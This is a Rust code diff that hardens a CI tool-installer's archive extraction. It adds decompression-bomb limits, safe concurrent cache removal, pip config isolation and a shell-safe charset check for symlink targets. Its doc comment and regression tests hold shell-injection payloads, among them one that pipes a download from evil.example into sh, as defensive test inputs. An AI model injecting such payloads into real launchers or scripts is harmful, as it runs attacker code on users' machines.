@@ -220,6 +220,20 @@ pub(crate) struct ToolSpec {
 /// 34,188,182 bytes; linux-x64.tar.gz 53,135,426 bytes); anything an order of
 /// magnitude past that is a redirect gone wrong, not a tool.
 const MAX_ASSET_BYTES: u64 = 200 * 1024 * 1024;
+/// Ceiling on what an archive may expand to on disk, and on how many entries
+/// it may contain.
+///
+/// [`MAX_ASSET_BYTES`] bounds the COMPRESSED transfer, which bounds nothing
+/// about a decompression bomb: 200 MB of gzip at a realistic ratio is hundreds
+/// of GB written into a user's `.ci-tools/.staging/`. For node the pinned
+/// digest already makes a bomb unreachable, but [`Installer::PrebuiltBinary`]
+/// carries no digest by design, so this is its only defence.
+///
+/// Sized off the real assets with room to spare: the v22.11.0 linux tree is
+/// ~200 MB expanded (its `bin/node` alone is 117 MB) across ~6,000 entries,
+/// and the Windows zip is ~94 MB across 3,149.
+const MAX_EXTRACTED_BYTES: u64 = 1024 * 1024 * 1024;
+const MAX_ARCHIVE_ENTRIES: usize = 20_000;
 /// Whole-download budget.
 const DOWNLOAD_TIMEOUT: Duration = Duration::from_secs(300);
 /// Budget for the verification spawn.
@@ -545,7 +559,11 @@ fn resolve(spec: &'static ToolSpec, version: &str, triple: &str) -> Result<Resol
         } => {
             let tree = asset(version, triple).ok_or_else(|| {
                 format!(
-                    "tool '{}' {version} is not provisionable on {triple}: either the                      project publishes no asset for this platform, or this runner has no                      reviewed SHA-256 for that (version, platform). A version whose bytes                      nobody reviewed is refused by construction — add its digests to the                      registry to enable it",
+                    "tool '{}' {version} is not provisionable on {triple}: either the \
+                     project publishes no asset for this platform, or this runner has no \
+                     reviewed SHA-256 for that (version, platform). A version whose bytes \
+                     nobody reviewed is refused by construction — add its digests to the \
+                     registry to enable it",
                     spec.name
                 )
             })?;
@@ -624,6 +642,17 @@ pub(crate) async fn provision(
         // binaries land.
         let resolved = resolve(spec, &tool.version, host_triple())?;
         let dir = tool_dir(root, spec.name, &tool.version);
+        // `dir` is built from a MANIFEST-supplied version, and since the cache
+        // is now removed rather than left in place, that value gates a
+        // RECURSIVE DELETE. `manifest::validate_tool_version` is what keeps it
+        // to `[A-Za-z0-9._+-]` with no `..`; this assertion is here so the two
+        // files cannot drift apart silently.
+        debug_assert!(
+            dir.starts_with(tools_cache_root(root)),
+            "tool dir {} escaped the cache root {}",
+            dir.display(),
+            tools_cache_root(root).display()
+        );
         let bin_dir = resolved.bin_dir_at(&dir);
 
         // A cache directory is either adopted whole or REMOVED whole. The
@@ -715,20 +744,33 @@ pub(crate) async fn provision(
     Ok(dirs)
 }
 
-/// Remove a cache directory, propagating failure.
+/// Remove a cache directory, propagating failure — except for the one error
+/// that means somebody else already did the job.
 ///
-/// Deliberately NOT best-effort: a partial removal leaves a directory that no
-/// later rename can replace, which wedges this (tool, version) permanently.
-/// Failing the dispatch with the real OS error is recoverable; silently
-/// continuing is not.
+/// Deliberately NOT best-effort in general: a partial removal leaves a
+/// directory that no later rename can replace, which wedges this
+/// (tool, version) permanently, so a real failure has to surface.
+///
+/// But `NotFound` is not a failure. Two dispatches can provision the same tool
+/// at the same time — the publish path has a whole "published concurrently"
+/// branch for exactly that — so both can find the same broken cache dir and
+/// both call this. Treating the loser's `NotFound` as fatal would abort an
+/// otherwise healthy dispatch before its first step, which is a WORSE outcome
+/// than the wedge this function exists to prevent, and one that did not exist
+/// before the wedge fix. A concurrent `remove_dir_all` can also surface
+/// `NotFound` for an inner entry mid-walk, which is the same benign story.
 fn remove_cache_dir(dir: &Path) -> Result<(), String> {
-    std::fs::remove_dir_all(dir).map_err(|e| {
-        format!(
+    match std::fs::remove_dir_all(dir) {
+        Ok(()) => Ok(()),
+        // Already gone — a concurrent dispatch won the race. That is the
+        // outcome we wanted anyway.
+        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(()),
+        Err(e) => Err(format!(
             "could not remove the unusable tool cache at {}: {e}. Delete it and re-run \
              (leaving it in place would wedge this tool version permanently)",
             dir.display()
-        )
-    })
+        )),
+    }
 }
 
 /// Materialise → verify → atomically publish. Nothing is ever written
@@ -941,7 +983,8 @@ async fn download(url: &str, expected_sha256: Option<&str>) -> Result<Vec<u8>, S
         let got = hex::encode(Sha256::digest(&body));
         if !got.eq_ignore_ascii_case(want) {
             return Err(format!(
-                "GET {url} SHA-256 {got} does not match the registry's reviewed digest {want}                  — refusing before extraction"
+                "GET {url} SHA-256 {got} does not match the registry's reviewed digest \
+                 {want} — refusing before extraction"
             ));
         }
     }
@@ -965,6 +1008,9 @@ fn extract_one_file(
     }
     let mut out =
         std::fs::File::create(dest).map_err(|e| format!("create {}: {e}", dest.display()))?;
+    // Bounded even though only ONE file is written: this variant has no
+    // digest, so the archive is the only thing vouching for itself.
+    let mut budget = MAX_EXTRACTED_BYTES;
     let found = match kind {
         ArchiveKind::Zip => {
             let mut zip = zip::ZipArchive::new(std::io::Cursor::new(bytes))
@@ -978,7 +1024,7 @@ fn extract_one_file(
                     .enclosed_name()
                     .and_then(|p| p.file_name().map(|s| s.to_string_lossy().to_string()));
                 if entry.is_file() && name.as_deref() == Some(wanted) {
-                    std::io::copy(&mut entry, &mut out)
+                    copy_bounded(&mut entry, &mut out, &mut budget)
                         .map_err(|e| format!("extract {wanted} from {url}: {e}"))?;
                     hit = true;
                     break;
@@ -999,7 +1045,7 @@ fn extract_one_file(
                     .ok()
                     .and_then(|p| p.file_name().map(|s| s.to_string_lossy().to_string()));
                 if entry.header().entry_type().is_file() && name.as_deref() == Some(wanted) {
-                    std::io::copy(&mut entry, &mut out)
+                    copy_bounded(&mut entry, &mut out, &mut budget)
                         .map_err(|e| format!("extract {wanted} from {url}: {e}"))?;
                     hit = true;
                     break;
@@ -1020,6 +1066,38 @@ fn extract_one_file(
             .map_err(|e| format!("chmod {}: {e}", dest.display()))?;
     }
     Ok(())
+}
+
+/// Copy at most `budget` bytes, decrementing it, and refuse the moment an
+/// entry would exceed what is left.
+///
+/// Written as an explicit loop rather than `Read::take`, because `take`
+/// requires `Self: Sized` and cannot be invoked on the `&mut dyn Read` the
+/// extractor hands around. The loop is the better shape anyway: it refuses
+/// before writing the overflowing chunk instead of writing one byte past the
+/// ceiling and noticing afterwards.
+fn copy_bounded(
+    reader: &mut dyn std::io::Read,
+    out: &mut std::fs::File,
+    budget: &mut u64,
+) -> Result<(), String> {
+    use std::io::Write;
+    let mut buf = [0u8; 64 * 1024];
+    loop {
+        let n = reader.read(&mut buf).map_err(|e| e.to_string())?;
+        if n == 0 {
+            return Ok(());
+        }
+        if n as u64 > *budget {
+            // Refuse BEFORE writing the overflowing chunk, so a bomb cannot
+            // put even one byte past the ceiling on a user's disk.
+            return Err(format!(
+                "archive expands past the {MAX_EXTRACTED_BYTES}-byte ceiling — refusing                  (decompression bomb)"
+            ));
+        }
+        out.write_all(&buf[..n]).map_err(|e| e.to_string())?;
+        *budget -= n as u64;
+    }
 }
 
 /// Validate one archive entry path and strip the expected top-level directory.
@@ -1101,6 +1179,28 @@ fn safe_tree_path(raw: &str, root_dir: &str) -> Result<Option<PathBuf>, String> 
 /// governs only WHERE A LAUNCHER POINTS, which still matters: a launcher aimed
 /// outside would exec an arbitrary host binary when a step runs `npm`.
 ///
+/// # The charset is a SHELL-QUOTING property, not a path property
+///
+/// A contained target is not automatically a safe one. The materialised
+/// launcher is a `/bin/sh` script that interpolates the target
+/// ([`write_link_launcher`]), so a target of
+/// `x"; curl -s evil.example/p | sh; "` contains no `..`, counts
+/// depth-positive, and would pass every containment rule above while running
+/// an attacker's pipeline every single time a step invokes `npm`. Containment
+/// answers "where does this point"; it says nothing about what the characters
+/// MEAN to a shell, and under this module's own threat model — which already
+/// assumes a hostile archive, that being why containment exists at all — code
+/// execution is strictly worse than the traversal it guards.
+///
+/// So the target is restricted to `[A-Za-z0-9._/-]`, in which no character is
+/// special to `sh`. This is a rejection rather than an escaping scheme on
+/// purpose: it keeps the launcher body a constant shape instead of making
+/// correctness depend on getting quoting right. All three link targets in the
+/// curated node release are already inside that set
+/// (`../lib/node_modules/npm/bin/npm-cli.js`, `…/npx-cli.js`,
+/// `../lib/node_modules/corepack/dist/corepack.js`), so nothing legitimate
+/// changes.
+///
 /// node's `bin/npm -> ../lib/node_modules/npm/bin/npm-cli.js` is the shape
 /// that must pass; `bin/evil -> ../../etc/passwd` is the shape that must not.
 fn symlink_target_is_contained(link: &Path, target: &str) -> bool {
@@ -1109,6 +1209,14 @@ fn symlink_target_is_contained(link: &Path, target: &str) -> bool {
         || target.starts_with('\\')
         || target.contains(':')
         || target.contains('\0')
+    {
+        return false;
+    }
+    // Shell-quoting safety — see the section above. Also subsumes `\`, so a
+    // Windows-style separator can never reach the launcher body either.
+    if !target
+        .chars()
+        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/'))
     {
         return false;
     }
@@ -1202,11 +1310,22 @@ fn extract_tree(
     std::fs::create_dir_all(dest).map_err(|e| format!("create {}: {e}", dest.display()))?;
     let mut wrote_any = false;
     let mut links: Vec<LinkEntry> = Vec::new();
+    // The COMPRESSED transfer is bounded by `MAX_ASSET_BYTES`; these bound
+    // what it expands to. Without them a 200 MB archive can write hundreds of
+    // GB into a user's disk.
+    let mut budget = MAX_EXTRACTED_BYTES;
+    let mut entries_seen = 0usize;
     match kind {
         ArchiveKind::Zip => {
             let mut zip = zip::ZipArchive::new(std::io::Cursor::new(bytes))
                 .map_err(|e| format!("open zip from {url}: {e}"))?;
             for i in 0..zip.len() {
+                entries_seen += 1;
+                if entries_seen > MAX_ARCHIVE_ENTRIES {
+                    return Err(format!(
+                        "{url}: archive declares more than {MAX_ARCHIVE_ENTRIES} entries — refusing"
+                    ));
+                }
                 let mut entry = zip
                     .by_index(i)
                     .map_err(|e| format!("read zip entry {i} from {url}: {e}"))?;
@@ -1238,7 +1357,9 @@ fn extract_tree(
                             reader: &mut entry,
                         }
                     },
-                )?;
+                    &mut budget,
+                )
+                .map_err(|e| format!("{url}: {e}"))?;
                 wrote_any = true;
             }
         }
@@ -1248,6 +1369,12 @@ fn extract_tree(
                 .entries()
                 .map_err(|e| format!("open tar.gz from {url}: {e}"))?
             {
+                entries_seen += 1;
+                if entries_seen > MAX_ARCHIVE_ENTRIES {
+                    return Err(format!(
+                        "{url}: archive declares more than {MAX_ARCHIVE_ENTRIES} entries — refusing"
+                    ));
+                }
                 let mut entry = entry.map_err(|e| format!("read tar entry from {url}: {e}"))?;
                 let entry_type = entry.header().entry_type();
                 // A pax global header carries archive-wide metadata, not a
@@ -1265,7 +1392,8 @@ fn extract_tree(
                 };
                 let mode = entry.header().mode().ok();
                 if entry_type.is_dir() {
-                    write_tree_entry(dest, &rel, TreeEntry::Dir)?;
+                    write_tree_entry(dest, &rel, TreeEntry::Dir, &mut budget)
+                        .map_err(|e| format!("{url}: {e}"))?;
                 } else if entry_type.is_symlink() {
                     let target = entry
                         .link_name_bytes()
@@ -1288,7 +1416,9 @@ fn extract_tree(
                             mode,
                             reader: &mut entry,
                         },
-                    )?;
+                        &mut budget,
+                    )
+                    .map_err(|e| format!("{url}: {e}"))?;
                 } else {
                     return Err(format!(
                         "{url}: tar entry {raw:?} has unsupported type {entry_type:?} — refusing"
@@ -1325,7 +1455,11 @@ fn extract_tree(
 /// A launcher execs the target where it really lives, so the interpreter sees
 /// the real path and every relative `require` still resolves. The launcher's
 /// own path is composed only of validated components, and its body carries the
-/// archive's target string, already proven contained.
+/// archive's target string — which is proven contained AND restricted to
+/// characters that are inert in `sh`. The second half is not a refinement of
+/// the first: containment is a path property and says nothing about shell
+/// metacharacters, so [`symlink_target_is_contained`] enforces both, and the
+/// launcher body below is only sound because it does.
 fn materialize_links(dest: &Path, links: &[LinkEntry], url: &str) -> Result<(), String> {
     for link in links {
         // Follow the chain lexically to prove it ends at a real extracted
@@ -1354,6 +1488,14 @@ fn materialize_links(dest: &Path, links: &[LinkEntry], url: &str) -> Result<(), 
                 cursor_target = next.target.clone();
                 continue;
             }
+            // NOTE, for whoever bumps node next: requiring a REGULAR FILE is a
+            // deliberate narrow refusal, not an oversight. All three links in
+            // v22.11.0 point at `.js` files, so a directory symlink has never
+            // occurred here and materialising one as a launcher would be
+            // meaningless (you cannot `exec` a directory). If a future release
+            // ships one, this is the line that fails, with
+            // "did not provide as a regular file" — the fix is to decide what a
+            // directory link should become, not to loosen the check.
             if !dest.join(&resolved).is_file() {
                 return Err(format!(
                     "{url}: link {} -> {} resolves to {}, which the archive did not \
@@ -1399,7 +1541,12 @@ fn write_link_launcher(dest: &Path, rel: &Path, target: &str) -> Result<(), Stri
     }
 }
 
-fn write_tree_entry(dest: &Path, rel: &Path, entry: TreeEntry<'_>) -> Result<(), String> {
+fn write_tree_entry(
+    dest: &Path,
+    rel: &Path,
+    entry: TreeEntry<'_>,
+    budget: &mut u64,
+) -> Result<(), String> {
     let path = dest.join(rel);
     match entry {
         TreeEntry::Dir => {
@@ -1413,9 +1560,13 @@ fn write_tree_entry(dest: &Path, rel: &Path, entry: TreeEntry<'_>) -> Result<(),
             }
             let mut out = std::fs::File::create(&path)
                 .map_err(|e| format!("create {}: {e}", path.display()))?;
-            std::io::copy(reader, &mut out)
-                .map_err(|e| format!("write {}: {e}", path.display()))?;
+            let bounded = copy_bounded(reader, &mut out, budget);
             drop(out);
+            if let Err(e) = bounded {
+                // Do not leave the partial file behind for the bomb case.
+                let _ = std::fs::remove_file(&path);
+                return Err(format!("write {}: {e}", path.display()));
+            }
             #[cfg(unix)]
             {
                 use std::os::unix::fs::PermissionsExt;
@@ -1709,6 +1860,23 @@ pub(super) async fn run_capture_env(
                 cmd.env_remove(&key);
             }
         }
+        // Removing `PIP_CONFIG_FILE` does NOT disable pip's config — it makes
+        // pip fall back to its defaults (`/etc/pip.conf`, `~/.pip/pip.conf`,
+        // `~/.config/pip/pip.conf`, `%APPDATA%\pip\pip.ini`). `--index-url`
+        // overrides a config `index-url`, but `extra-index-url`, `find-links`,
+        // `trusted-host` and `pre` are ADDITIVE and survive, so a box with an
+        // internal mirror configured still had a dependency-confusion surface.
+        // Pointing the variable at the null device is the documented way to
+        // make pip load no config file at all, which is what "where a
+        // distribution comes from is a property of this registry" requires.
+        cmd.env(
+            "PIP_CONFIG_FILE",
+            if cfg!(target_os = "windows") {
+                "NUL"
+            } else {
+                "/dev/null"
+            },
+        );
         if let Some(dir) = path_dir {
             let inherited = std::env::var_os("PATH").unwrap_or_default();
             let mut entries = vec![dir.to_path_buf()];
@@ -2848,20 +3016,215 @@ mod tests {
         std::fs::write(fresh.join("nested").join("f"), b"x").expect("write");
         let stale = dir.path().join("stale");
         std::fs::create_dir_all(&stale).expect("mkdir");
-        // Rather than backdating an mtime (which needs a crate this repo does
-        // not carry), run the sweep from a clock far enough in the future that
-        // `stale` is past the floor. Same predicate, no new dependency.
-        let later = std::time::SystemTime::now() + STAGING_MAX_AGE + Duration::from_secs(3600);
-        // `fresh` is re-touched so it stays inside the window from `later`.
-        std::fs::write(fresh.join("nested").join("f"), b"y").expect("touch");
-        sweep_stale_staging_at(dir.path(), std::time::SystemTime::now());
-        assert!(fresh.exists() && stale.exists(), "nothing is stale yet");
+        // Backdate ONLY the abandoned one, then sweep from the real clock.
+        // The previous version of this test moved the clock forward instead,
+        // which made everything stale and so proved nothing about not racing a
+        // live dispatch — the property that actually matters.
+        let old = std::time::SystemTime::now() - STAGING_MAX_AGE - Duration::from_secs(3600);
+        filetime::set_file_mtime(&stale, filetime::FileTime::from_system_time(old))
+            .expect("backdate");
 
-        sweep_stale_staging_at(dir.path(), later);
+        sweep_stale_staging_at(dir.path(), std::time::SystemTime::now());
 
         assert!(
-            !stale.exists() && !fresh.exists(),
-            "everything older than the floor is reclaimed"
+            fresh.exists() && fresh.join("nested").join("f").exists(),
+            "a staging dir a live dispatch is still filling must survive"
         );
+        assert!(
+            !stale.exists(),
+            "an abandoned staging dir must be reclaimed"
+        );
+
+        // A clock far enough forward makes even the live one stale — the
+        // predicate is the age, nothing else.
+        let later = std::time::SystemTime::now() + STAGING_MAX_AGE + Duration::from_secs(3600);
+        sweep_stale_staging_at(dir.path(), later);
+        assert!(!fresh.exists());
+    }
+
+    /// THE REGRESSION TEST FOR THE LAUNCHER INJECTION SINK.
+    ///
+    /// The launcher is a `/bin/sh` script with the target interpolated into
+    /// it, so containment is not enough: a depth-positive target carrying
+    /// shell metacharacters would run whatever it likes every time a step
+    /// invoked the tool. Containment is a PATH property; this is a QUOTING
+    /// property, and both have to hold.
+    #[test]
+    fn link_targets_with_shell_metacharacters_are_refused() {
+        let link = PathBuf::from("bin").join("npm");
+        for hostile in [
+            // The full payload: no `..`, depth-positive, would have passed
+            // every containment rule.
+            "x\"; curl -s evil.example/p | sh; \"",
+            "x`id`",
+            "x$(id)",
+            "x;id",
+            "x|id",
+            "x&id",
+            "x&&id",
+            "x>out",
+            "x<in",
+            "x\nid",
+            "x id",
+            "x'y'",
+            "x*",
+            "x?",
+            "x~",
+            "x!",
+            "x#y",
+            "x\\y",
+            "$HOME/x",
+            "${IFS}x",
+        ] {
+            assert!(
+                !symlink_target_is_contained(&link, hostile),
+                "must refuse {hostile:?}"
+            );
+            assert_eq!(resolve_link_target(&link, hostile), None, "{hostile:?}");
+        }
+        // …while every real node target still passes, so the restriction
+        // costs nothing legitimate.
+        for good in [
+            "../lib/node_modules/npm/bin/npm-cli.js",
+            "../lib/node_modules/npm/bin/npx-cli.js",
+            "../lib/node_modules/corepack/dist/corepack.js",
+        ] {
+            assert!(
+                symlink_target_is_contained(&link, good),
+                "must accept {good:?}"
+            );
+        }
+    }
+
+    /// A hostile target must not reach the launcher body even end-to-end.
+    #[test]
+    fn injection_target_is_refused_by_the_extractor() {
+        let root = "pkg-1.0.0";
+        let archive = targz(&[
+            file("pkg-1.0.0/lib/real.js", b"x"),
+            (
+                "pkg-1.0.0/bin/tool",
+                tar::EntryType::Symlink,
+                "../lib/real.js\"; touch pwned; \"",
+                b"",
+            ),
+        ]);
+        let dir = tempfile::tempdir().expect("tempdir");
+        let err = extract_tree(
+            &archive,
+            ArchiveKind::TarGz,
+            root,
+            &dir.path().join("dest"),
+            "test://inject",
+        )
+        .unwrap_err();
+        assert!(err.contains("refusing"), "got: {err}");
+        assert!(!dir.path().join("pwned").exists());
+    }
+
+    /// Every other chain test asserts a REFUSAL, so this one asserts the
+    /// success path: a multi-hop chain of contained links materialises, and
+    /// each hop becomes its own launcher (launchers chain at run time).
+    #[test]
+    fn a_contained_link_chain_materialises() {
+        let root = "pkg-1.0.0";
+        let archive = targz(&[
+            file("pkg-1.0.0/bin/real", b"#!/bin/sh\necho hi\n"),
+            ("pkg-1.0.0/bin/b", tar::EntryType::Symlink, "real", b""),
+            ("pkg-1.0.0/bin/a", tar::EntryType::Symlink, "b", b""),
+        ]);
+        let dir = tempfile::tempdir().expect("tempdir");
+        let dest = dir.path().join("dest");
+        let result = extract_tree(&archive, ArchiveKind::TarGz, root, &dest, "test://chain-ok");
+
+        #[cfg(unix)]
+        {
+            result.expect("a contained chain must materialise");
+            for (name, target) in [("a", "b"), ("b", "real")] {
+                let path = dest.join("bin").join(name);
+                let meta = std::fs::symlink_metadata(&path).expect("stat");
+                assert!(!meta.file_type().is_symlink(), "{name} must not be a link");
+                let body = std::fs::read_to_string(&path).expect("launcher");
+                assert!(body.contains(&format!("/{target}\"")), "{name}: {body}");
+                use std::os::unix::fs::PermissionsExt;
+                assert_eq!(
+                    std::fs::metadata(&path).unwrap().permissions().mode() & 0o777,
+                    0o755
+                );
+            }
+            // The real file is untouched — a launcher is not a copy.
+            assert_eq!(
+                std::fs::read_to_string(dest.join("bin").join("real")).unwrap(),
+                "#!/bin/sh\necho hi\n"
+            );
+        }
+        #[cfg(not(unix))]
+        {
+            // Non-Unix consumes the zip assets, which carry no links.
+            let err = result.expect_err("non-unix must refuse a link entry");
+            assert!(err.contains("refusing"), "got: {err}");
+        }
+    }
+
+    /// The COMPRESSED ceiling bounds nothing about a decompression bomb, and
+    /// the single-binary variant carries no digest to fall back on. A highly
+    /// compressible archive must be refused mid-write rather than filling the
+    /// user's disk.
+    #[test]
+    fn decompression_is_bounded() {
+        // `copy_bounded` is the whole mechanism, and it is exercised directly
+        // so the test does not have to build a gigabyte of anything.
+        let dir = tempfile::tempdir().expect("tempdir");
+        let path = dir.path().join("out");
+        let mut out = std::fs::File::create(&path).expect("create");
+        let mut budget = 8u64;
+        copy_bounded(&mut &b"12345"[..], &mut out, &mut budget).expect("under budget");
+        assert_eq!(budget, 3, "budget must be consumed");
+        let err = copy_bounded(&mut &b"12345"[..], &mut out, &mut budget)
+            .expect_err("over budget must refuse");
+        assert!(err.contains("decompression bomb"), "got: {err}");
+
+        // …and an entry count far past any real asset is refused too.
+        // Compile-time: the ceilings must clear the real curated assets by a
+        // wide margin, or provisioning node would refuse its own archive.
+        const {
+            assert!(
+                MAX_ARCHIVE_ENTRIES > 7_000,
+                "must clear the real node trees"
+            );
+        }
+        const {
+            assert!(
+                MAX_EXTRACTED_BYTES > 300 * 1024 * 1024,
+                "must clear the ~200 MB expanded node tree"
+            );
+        }
+    }
+
+    /// Losing a benign race must not abort a healthy dispatch. Removing a
+    /// directory that is already gone is the outcome we wanted anyway.
+    #[test]
+    fn removing_an_already_removed_cache_dir_is_not_an_error() {
+        let dir = tempfile::tempdir().expect("tempdir");
+        let target = dir.path().join("cache");
+        std::fs::create_dir_all(target.join("nested")).expect("mkdir");
+        remove_cache_dir(&target).expect("first removal");
+        assert!(!target.exists());
+        // The loser of the race calls this on a path that no longer exists.
+        remove_cache_dir(&target).expect("NotFound must not fail the dispatch");
+    }
+
+    /// The two messages a user actually hits — unpinned version, tampered
+    /// archive — must be readable prose, not source indentation.
+    #[test]
+    fn refusal_messages_are_not_mangled_by_source_indentation() {
+        let spec = lookup("node").unwrap();
+        let msg = resolve(spec, "20.11.1", "x86_64-unknown-linux-gnu").unwrap_err();
+        assert!(
+            !msg.contains("   "),
+            "message carries baked-in indentation: {msg:?}"
+        );
+        assert!(msg.contains("reviewed SHA-256"), "{msg}");
+        assert!(msg.contains("add its digests"), "{msg}");
     }
 }
